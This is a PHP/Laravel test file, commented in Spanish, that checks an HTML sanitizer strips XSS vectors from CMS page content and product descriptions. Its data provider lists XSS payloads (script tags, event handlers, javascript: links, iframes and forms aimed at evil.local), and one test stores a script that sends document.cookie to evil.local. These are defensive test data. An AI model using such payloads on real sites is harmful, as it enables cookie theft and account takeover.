<?php

namespace Tests\Feature;

use App\Models\CmsPage;
use App\Models\Product;
use App\Support\HtmlSanitizer;
use Illuminate\Foundation\Testing\RefreshDatabase;
use PHPUnit\Framework\Attributes\DataProvider;
use Tests\TestCase;

/**
 * El contenido de páginas CMS y la descripción de productos se renderizan en el
 * front con dangerouslySetInnerHTML. Filament no sanitiza la salida del
 * RichEditor, así que un usuario del panel con permisos acotados podía dejar
 * JavaScript que corría en el navegador de cada visitante y de los otros admins.
 *
 * Se sanitiza al escribir: lo que queda en la base ya está limpio.
 */
class HtmlSanitizationTest extends TestCase
{
    use RefreshDatabase;

    /** @return array<string, array{0: string}> */
    public static function payloadsPeligrosos(): array
    {
        return [
            'script directo'      => ['<p>Hola</p><script>alert(1)</script>'],
            'onerror en img'      => ['<img src="x" onerror="alert(1)">'],
            'onclick en link'     => ['<a href="/x" onclick="alert(1)">click</a>'],
            'javascript: en href' => ['<a href="javascript:alert(1)">click</a>'],
            'javascript ofuscado' => ['<a href="JaVaScRiPt:alert(1)">click</a>'],
            'iframe'              => ['<iframe src="https://evil.local"></iframe>'],
            'svg con onload'      => ['<svg onload="alert(1)"></svg>'],
            'style con expression'=> ['<style>body{background:url("javascript:alert(1)")}</style>'],
            'form'                => ['<form action="https://evil.local"><input name="pass"></form>'],
            'object'              => ['<object data="https://evil.local"></object>'],
        ];
    }

    #[DataProvider('payloadsPeligrosos')]
    public function test_el_sanitizador_elimina_vectores_de_xss(string $payload): void
    {
        $clean = (string) HtmlSanitizer::clean($payload);

        $this->assertStringNotContainsString('<script', strtolower($clean));
        $this->assertStringNotContainsString('<iframe', strtolower($clean));
        $this->assertStringNotContainsString('<object', strtolower($clean));
        $this->assertStringNotContainsString('<form', strtolower($clean));
        $this->assertStringNotContainsString('onerror', strtolower($clean));
        $this->assertStringNotContainsString('onclick', strtolower($clean));
        $this->assertStringNotContainsString('onload', strtolower($clean));
        $this->assertStringNotContainsString('javascript:', strtolower($clean));
    }

    public function test_conserva_el_html_legitimo(): void
    {
        $html = '<h2>Título</h2><p>Un texto con <strong>negrita</strong> y '
            .'<a href="https://moirabikinis.ar" title="ir">un link</a>.</p>'
            .'<ul><li>uno</li><li>dos</li></ul>';

        $clean = (string) HtmlSanitizer::clean($html);

        $this->assertStringContainsString('<h2>Título</h2>', $clean);
        $this->assertStringContainsString('<strong>negrita</strong>', $clean);
        $this->assertStringContainsString('https://moirabikinis.ar', $clean);
        $this->assertStringContainsString('<li>uno</li>', $clean);
    }

    public function test_conserva_el_texto_de_los_tags_no_permitidos(): void
    {
        // El tag se descarta pero el contenido legítimo no se pierde.
        $clean = (string) HtmlSanitizer::clean('<marquee>Texto importante</marquee>');

        $this->assertStringNotContainsString('marquee', strtolower($clean));
        $this->assertStringContainsString('Texto importante', $clean);
    }

    public function test_agrega_rel_noopener_a_los_links_target_blank(): void
    {
        $clean = (string) HtmlSanitizer::clean('<a href="https://x.local" target="_blank">ir</a>');

        $this->assertStringContainsString('noopener', $clean);
    }

    public function test_deja_pasar_urls_relativas_y_anclas(): void
    {
        $clean = (string) HtmlSanitizer::clean('<a href="/productos">catálogo</a><a href="#faq">faq</a>');

        $this->assertStringContainsString('href="/productos"', $clean);
        $this->assertStringContainsString('href="#faq"', $clean);
    }

    public function test_la_pagina_cms_se_guarda_sanitizada(): void
    {
        $page = CmsPage::create([
            'title'   => 'Términos',
            'slug'    => 'terminos',
            'content' => '<p>Legal</p><script>fetch("https://evil.local?c="+document.cookie)</script>',
        ]);

        $this->assertStringNotContainsString('<script', strtolower($page->fresh()->content));
        $this->assertStringContainsString('Legal', $page->fresh()->content);
    }

    public function test_la_descripcion_del_producto_se_guarda_sanitizada(): void
    {
        $product = Product::factory()->create([
            'description' => '<p>Bikini</p><img src="x" onerror="alert(document.cookie)">',
        ]);

        $stored = strtolower((string) $product->fresh()->description);

        $this->assertStringNotContainsString('onerror', $stored);
        $this->assertStringContainsString('bikini', $stored);
    }

    public function test_el_valor_nulo_o_vacio_no_rompe(): void
    {
        $this->assertNull(HtmlSanitizer::clean(null));
        $this->assertSame('', HtmlSanitizer::clean(''));
    }
}
